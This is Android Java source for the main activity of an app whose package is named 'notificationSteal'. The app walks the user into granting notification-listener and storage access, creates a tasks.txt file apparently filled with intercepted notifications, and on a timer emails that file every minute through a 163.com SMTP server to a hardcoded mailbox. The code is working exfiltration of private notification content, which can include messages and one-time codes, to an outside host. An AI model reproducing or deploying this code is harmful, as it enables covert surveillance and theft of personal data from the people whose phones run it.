package com.tomridder.notificationSteal;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.File;

import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

public class MainActivity extends AppCompatActivity {

    private String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE};
    Button notificationMonitorOffBtn;
    Button notificationMonitorOnBtn;
    private  String path1=Environment.getExternalStorageDirectory().toString()+ File.separator+"tasks.txt";

    final Handler handler=new Handler();
    Runnable runnable=new Runnable() {
        @Override
        public void run() {
            sendEmail();
            handler.postDelayed(this,60000);
        }
    };
    public  void sendEmail()
    {

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    EmailSender sender = new EmailSender();
                    //设置服务器地址和端口，可以查询网络
                    sender.setProperties("smtp.163.com", "25");
                    //分别设置发件人，邮件标题和文本内容
                    sender.setMessage("tomridder716@163.com", " 你好" + "-" ,
                            "通知内容请见附件");
                    //设置收件人
                    sender.setReceiver(new String[]{"tomridder716@163.com"});
                    //添加附件换成你手机里正确的路径
                    sender.addAttachment(path1);
                    //发送邮件
                    //sender.setMessage"&#x4f60;&#x7684;163&#x90ae;&#x7bb1;&#x8d26;&#x53f7;", "EmailS//ender", "Java Mail &#xff01;");&#x8fd9;&#x91cc;&#x9762;&#x4e24;&#x4e2a;&#x90ae;&#x7bb1;&#x8d26;&#x53f7;&#x8981;&#x4e00;&#x81f4;
                    sender.sendEmail("smtp.163.com", "tomridder716@163.com", "请填入你的163授权码，不是登录密码。");
                } catch (AddressException e) {
                    e.printStackTrace();
                } catch (MessagingException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        Log.i("MainActivityMTS","send email tried");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 通知栏监控器开关
         notificationMonitorOnBtn = (Button)findViewById(R.id.notification_monitor_on_btn);
        notificationMonitorOnBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //
                if (!isEnabled()) {
                    startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                } else {
                    Toast toast = Toast.makeText(getApplicationContext(), "监控器开关已打开", Toast.LENGTH_SHORT);
                    toast.show();
                    toggleNotificationListenerService();
                }
            }
        });

        notificationMonitorOffBtn = (Button)findViewById(R.id.notification_monitor_off_btn);
        notificationMonitorOffBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //
                if (isEnabled()) {
                    startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                } else {
                    Toast toast = Toast.makeText(getApplicationContext(), "监控器开关已关闭", Toast.LENGTH_SHORT);
                    toast.show();
                }
            }
        });
        if(isFristRun()||ContextCompat.checkSelfPermission(this, permissions[0])!= PackageManager.PERMISSION_GRANTED )
        {
            notificationMonitorOnBtn.setVisibility(View.INVISIBLE);
            notificationMonitorOffBtn.setVisibility(View.INVISIBLE);
        }
        initPermission();
        handler.postDelayed(runnable,60000);
    }

    private void initPermission()
    {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        {
            if( ContextCompat.checkSelfPermission(this, permissions[0])!= PackageManager.PERMISSION_GRANTED)
            {
                ActivityCompat.requestPermissions(this,permissions,321);
            }
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if(requestCode==321 && grantResults[0]==PackageManager.PERMISSION_GRANTED)

        {
           notificationMonitorOnBtn.setVisibility(View.VISIBLE);
           notificationMonitorOffBtn.setVisibility(View.VISIBLE);
           creatFile();
        }
    }

    private void creatFile()
    {
        String filePath=null;
        boolean hasSDCard= Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);
        if(hasSDCard)
        {
            filePath= Environment.getExternalStorageDirectory().toString()+ File.separator+"tasks.txt";
        }else
        {
            filePath=Environment.getDownloadCacheDirectory().toString().toString()+File.separator+"tasks.txt";
        }
        try
        {
            File file = new File(filePath);
            if (!file.exists()) {
                File dir = new File(file.getParent());
                dir.mkdir();
                file.createNewFile();
            }
            if(file.exists())
            {
                Log.i("MainActivityMTS","create successful");
            }
        }catch (Exception e)
        {
            Log.i("MainActivityMTS","can not creat file");
        }

    }

    private boolean isFristRun() {
        //实例化SharedPreferences对象（第一步）
        SharedPreferences sharedPreferences = this.getSharedPreferences(
                "share", MODE_PRIVATE);
        //实例化SharedPreferences.Editor对象（第二步）
        boolean isFirstRun = sharedPreferences.getBoolean("isFirstRun", true);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (!isFirstRun) {
            return false;
        } else {
            //保存数据 （第三步）
            editor.putBoolean("isFirstRun", false);
            //提交当前数据 （第四步）
            editor.commit();
            return true;
        }
    }
    // 判断是否打开了通知监听权限
    private boolean isEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void toggleNotificationListenerService() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationInterceptorService.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationInterceptorService.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
}
